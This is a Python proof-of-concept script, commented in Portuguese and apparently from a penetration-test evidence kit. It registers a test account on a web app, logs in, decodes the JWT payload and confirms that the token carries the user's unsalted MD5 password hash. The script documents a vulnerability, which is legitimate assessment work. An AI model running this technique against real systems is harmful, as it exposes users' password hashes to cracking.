"""Prova de conceito de exposição de hash de senha (A02 Cryptographic Failures).

Complementa a evidência original (JWT do administrador decodificado em
jwt.io) com uma versão reproduzível por linha de comando, usando uma
conta de teste própria: registra a conta, autentica, decodifica o
payload do JWT retornado (sem quebrar a assinatura, apenas decodificação
base64) e confirma que o hash embutido é um MD5 sem sal da senha em
texto claro.
"""

from __future__ import annotations

import hashlib
import json
import uuid

from scripts.lib import config
from scripts.lib.evidence import EvidenceRecorder
from scripts.lib.http_session import ScopedSession
from scripts.lib.jwt_tools import decodificar_payload

ACHADO_ID = "V2"
SLUG = "hash-senha-jwt"


def executar() -> None:
    """Executa a prova de conceito de ponta a ponta e imprime o veredito."""
    recorder = EvidenceRecorder(ACHADO_ID, SLUG)
    sessao = ScopedSession(recorder=recorder)

    email = f"crypto-{uuid.uuid4().hex[:10]}@lab.local"
    senha = "SenhaDeAnalise#3"

    sessao.post(
        f"{config.BASE_URL}/api/Users",
        json={
            "email": email,
            "password": senha,
            "passwordRepeat": senha,
            "securityQuestion": {"id": 1},
            "securityAnswer": "resposta-de-teste",
        },
    )
    resposta_login = sessao.post(
        f"{config.BASE_URL}/rest/user/login",
        json={"email": email, "password": senha},
    )
    token = resposta_login.json()["authentication"]["token"]
    payload = decodificar_payload(token)
    hash_no_token = payload["data"]["password"]
    hash_calculado = hashlib.md5(senha.encode("utf-8")).hexdigest()

    analise = (
        f"Email de teste: {email}\n"
        f"Senha em texto claro usada no cadastro: {senha}\n"
        f"Payload decodificado do JWT (base64, sem verificação de assinatura):\n"
        f"{json.dumps(payload, indent=2, ensure_ascii=False)}\n\n"
        f"Hash presente no campo 'password' do payload: {hash_no_token}\n"
        f"MD5 calculado localmente sobre a senha em texto claro: {hash_calculado}\n"
        f"Hashes idênticos: {hash_no_token == hash_calculado}\n"
    )
    (recorder.achado_directory / "analise-jwt.txt").write_text(analise, encoding="utf-8")

    print(f"Hash no JWT: {hash_no_token}")
    print(f"MD5(senha) calculado localmente: {hash_calculado}")
    if hash_no_token == hash_calculado:
        print("RESULTADO: confirmado — o JWT expõe o hash MD5 sem sal da senha do usuário.")
    else:
        print("RESULTADO: hashes não coincidem, achado não confirmado nesta execução.")
    print(f"Evidência gravada em: {recorder.achado_directory}")


if __name__ == "__main__":
    executar()
